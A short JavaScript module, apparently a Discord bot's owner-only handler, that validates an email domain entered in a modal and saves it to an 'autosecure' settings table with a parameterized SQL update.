const { queryParams } = require("../../../db/db");
const listSettings = require("../../utils/listSettings");

module.exports = {
    name: "emaildomain",
    ownerOnly: true,
    callback: async (client, interaction) => {
        let domain = interaction.components[0].components[0].value;
        if (isValidDomain(domain)) {
            await queryParams(`UPDATE autosecure SET domain=? WHERE user_id=?`, [domain, client.username])
            return interaction.update(await listSettings(client.username))
        } else {
            return interaction.update(`Invalid domain!`)
        }
    }
}
const isValidDomain = (domain) => {
    const regex = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return regex.test(domain);
};